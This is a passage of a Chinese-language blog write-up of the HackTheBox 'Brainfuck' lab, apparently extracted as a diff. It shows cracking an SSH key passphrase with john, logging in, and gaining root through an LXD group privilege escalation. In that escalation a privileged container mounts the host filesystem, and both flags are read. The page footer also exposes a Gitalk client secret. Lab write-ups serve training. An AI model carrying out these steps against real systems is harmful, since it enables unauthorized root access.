+└─# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_decode 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+3poulakia!       (id_rsa)     
+1g 0:00:00:03 DONE (2023-01-19 15:20) 0.3095g/s 3857Kp/s 3857Kc/s 3857KC/s 3prash0..3pornuthin
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<p>得到了私钥的密码</p>
+<pre><code class="bash">3poulakia!
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ssh orestis@10.10.10.17 -i id_rsa
+Enter passphrase for key &#39;id_rsa&#39;: 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+You have mail.
+Last login: Mon Oct  3 19:41:38 2022 from 10.10.14.23
+orestis@brainfuck:~$ id&amp;&amp;whoami
+orestis@brainfuck:~$ whoami&amp;&amp;id
+orestis
+uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
+</code></pre>
+<p>成功得到 user 权限</p>
+<pre><code class="bash">orestis@brainfuck:~$ cat user.txt 
+2c11cfbc5b959f73ac15a3310bd097c9
+</code></pre>
+<p>成功得到 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>通过上面的 id 我们可以看到，当前用户在 lxd 权限组中</p>
+<blockquote>
+<p><a href="https://www.exploit-db.com/exploits/46978" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/46978</a></p>
+</blockquote>
+<p>通过搜索 lxd 找到了一个 exploit</p>
+<h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
+--2023-01-19 15:28:34--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
+正在解析主机 raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8003::154, 2606:50c0:8000::154, 2606:50c0:8002::154, ...
+正在连接 raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8003::154|:443... 已连接。
+已发出 HTTP 请求，正在等待回应... 200 OK
+长度：8060 (7.9K) [text/plain]
+正在保存至: “build-alpine”
+
+build-alpine                                         100%[=====================================================================================================================&gt;]   7.87K  --.-KB/s  用时 0s      
+
+2023-01-19 15:28:35 (27.1 MB/s) - 已保存 “build-alpine” [8060/8060])
+</code></pre>
+<p>首先下载 build-alpine</p>
+<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>接着运行</p>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ./build-alpine 
+Determining the latest release... v3.17
+Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.17/main/x86_64
+Downloading alpine-keys-2.4-r1.apk
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+Downloading apk-tools-static-2.12.10-r1.apk
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+tar: 忽略未知的扩展头关键字‘APK-TOOLS.checksum.SHA1’
+alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: 成功
+Verified OK
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2527  100  2527    0     0    740      0  0:00:03  0:00:03 --:--:--   741
+--2023-01-19 15:38:57--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
+正在解析主机 alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 2a00:1f00:dc06:10::106, 93.187.10.106
+正在连接 alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|2a00:1f00:dc06:10::106|:80... 已连接。
+已发出 HTTP 请求，正在等待回应... 200 OK
+长度：2527 (2.5K) [text/plain]
+正在保存至: “/root/Desktop/rootfs/usr/share/alpine-mirrors/MIRRORS.txt”
+
+/root/Desktop/rootfs/usr/share/alpine-mirrors/MIRROR 100%[=====================================================================================================================&gt;]   2.47K  --.-KB/s  用时 0s      
+
+2023-01-19 15:39:00 (77.3 MB/s) - 已保存 “/root/Desktop/rootfs/usr/share/alpine-mirrors/MIRRORS.txt” [2527/2527])
+
+Selecting mirror http://mirror.clarkson.edu/alpine//v3.17/main
+fetch http://mirror.clarkson.edu/alpine//v3.17/main/x86_64/APKINDEX.tar.gz
+(1/25) Installing alpine-baselayout-data (3.4.0-r0)
+(2/25) Installing musl (1.2.3-r4)
+(3/25) Installing busybox (1.35.0-r29)
+Executing busybox-1.35.0-r29.post-install
+(4/25) Installing busybox-binsh (1.35.0-r29)
+(5/25) Installing alpine-baselayout (3.4.0-r0)
+Executing alpine-baselayout-3.4.0-r0.pre-install
+Executing alpine-baselayout-3.4.0-r0.post-install
+(6/25) Installing ifupdown-ng (0.12.1-r1)
+(7/25) Installing libcap2 (2.66-r0)
+(8/25) Installing openrc (0.45.2-r7)
+Executing openrc-0.45.2-r7.post-install
+(9/25) Installing mdev-conf (4.3-r0)
+(10/25) Installing busybox-mdev-openrc (1.35.0-r29)
+(11/25) Installing alpine-conf (3.15.0-r0)
+(12/25) Installing alpine-keys (2.4-r1)
+(13/25) Installing alpine-release (3.17.1-r0)
+(14/25) Installing ca-certificates-bundle (20220614-r4)
+(15/25) Installing libcrypto3 (3.0.7-r2)
+(16/25) Installing libssl3 (3.0.7-r2)
+(17/25) Installing ssl_client (1.35.0-r29)
+(18/25) Installing zlib (1.2.13-r0)
+(19/25) Installing apk-tools (2.12.10-r1)
+(20/25) Installing busybox-openrc (1.35.0-r29)
+(21/25) Installing busybox-suid (1.35.0-r29)
+(22/25) Installing scanelf (1.3.5-r1)
+(23/25) Installing musl-utils (1.2.3-r4)
+(24/25) Installing libc-utils (0.7.2-r3)
+(25/25) Installing alpine-base (3.17.1-r0)
+Executing busybox-1.35.0-r29.trigger
+OK: 10 MiB in 25 packages
+</code></pre>
+<pre><code class="bash">┌──(root㉿kali)-[~/Desktop]
+└─# ls
+ alpine-v3.17-x86_64-20230119_1539.tar.gz
+</code></pre>
+<p>多了一个压缩文件</p>
+<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>使用 python3 开启一个 http 服务</p>
+<pre><code class="bash">python3 -m http.server 80
+</code></pre>
+<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>在靶机中使用 wget 下载，然后运行</p>
+<pre><code class="bash">orestis@brainfuck:~$ wget http://10.10.16.11/alpine-v3.17-x86_64-20230119_1539.tar.gz
+--2023-01-19 09:41:24--  http://10.10.16.11/alpine-v3.17-x86_64-20230119_1539.tar.gz
+Connecting to 10.10.16.11:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3792999 (3.6M) [application/gzip]
+Saving to: ‘alpine-v3.17-x86_64-20230119_1539.tar.gz’
+
+alpine-v3.17-x86_64-20230119_1539.tar.gz             100%[=====================================================================================================================&gt;]   3.62M   810KB/s    in 11s     
+
+2023-01-19 09:41:37 (328 KB/s) - ‘alpine-v3.17-x86_64-20230119_1539.tar.gz’ saved [3792999/3792999]
+</code></pre>
+<pre><code class="bash">orestis@brainfuck:~$ lxc image import alpine-v3.17-x86_64-20230119_1539.tar.gz --alias test
+Generating a client certificate. This may take a minute...
+If this is your first time using LXD, you should also run: sudo lxd init
+To start your first container, try: lxc launch ubuntu:16.04
+
+Image imported with fingerprint: 2f15d7d049eb4ce507a0ec903b690f37e78c2166c9d6fd062dbfed81b3816467
+orestis@brainfuck:~$ lxc image list
++-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| ALIAS | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| test  | 2f15d7d049eb | no     | alpine v3.17 (20230119_15:39) | x86_64 | 3.62MB | Jan 19, 2023 at 7:43am (UTC) |
++-------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+</code></pre>
+<p>已经运行成功了，咱们去继续利用</p>
+<pre><code class="bash">lxc init test test -c security.privileged=true # 初始化镜像
+lxc config device add test test disk source=/ path=/mnt/root recursive=true # 挂载磁盘
+lxc start test # 启动镜像
+lxc exec test /bin/sh # 进入镜像
+</code></pre>
+<pre><code class="bash">orestis@brainfuck:~$ lxc exec test /bin/sh
+~ # whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root)
+</code></pre>
+<p>成功拿到 root 权限</p>
+<pre><code class="bash">~ # cat /mnt/root/root/root.txt
+6efc1a5dbb8904751ce6566a305bb8ef
+</code></pre>
+<p>成功拿到 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/&title=《Brainfuck - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/&title=《Brainfuck - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Brainfuck - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/03/30/Hackthebox/Easy/Hackthebox-LaCasaDePapel/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">LaCasaDePapel - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/&title=《Brainfuck - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/&title=《Brainfuck - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Brainfuck - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsElEQVR42u3aUW7jMAwE0N7/0rsHKOLMkFKbAs9fQZHaev4QmRG/vuLr37fr+Tv5Hb5/Tr55+MLDw8NbL/3VrZ//noBzTHKf6A54eHh413ivbpp8Jy8GyQt6dc98PXh4eHifxmub5ud7bgoDHh4e3l/hJdHAJrbI23E8PDy83+W1EWrxgDjOeC4S17MWPDw8vJiXnyJ9zucr53t4eHh461P1dsPNH3+2eLxcLR4eHt4FXr6s5zY3aYX3r2y4Tjw8PLyjvCRumAW4eYSRjGQNj8Hw8PDwLvM2kUR+6DVjJE15cbKHh4eHt+CdOrDPc9R2oW0xeLNCPDw8vB/htfjn+HWGP3ayh4eHh3eNly8uP76avcR29OpNAcPDw8Nb89o2t93i8wZ9P3JaZC14eHh4h3jtg5My0DbNbaRbFAY8PDy8Q7zZkdJ+o2+HEtpwGQ8PD+8e73lBeUloB0nzlzIbMsDDw8P7SV47xjRrxPNNf3Nch4eHh3ePt/nBn2/3+/P9toDh4eHh3eDNhrGSm25a59no1QqJh4eHF/PyDXcfrbZx7WwQAQ8PD+82L39wPpiVNMft0meDYnh4eHj3ePmyksLQloTZkFbxiwEPDw/vAi8PT/P2Nw8y9kUoauXx8PDwjvLaZrcdFMib79krfhP44uHh4V3jzYKJtglehbA56VQ4g4eHh/fIy0OH/KUkI1ltccovPDw8vNu8PLeot+bRf9VzYUlLjYeHh7fmzbba/RBA22S37TseHh7ePd5sw20fPBtEGJ7jzS48PDy8kpcXg7aBng0NzKLeIsbFw8PDO8TLH9NGt7Ng93BNw8PDw/tV3iz2nYW/mzgDDw8P79N4+8a3PWxrW3M8PDy827xNK3zjSKyNel+C8fDw8C7wNr/on5ebjwLku3q7Njw8PLyjvP9coxbbpaeWNwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
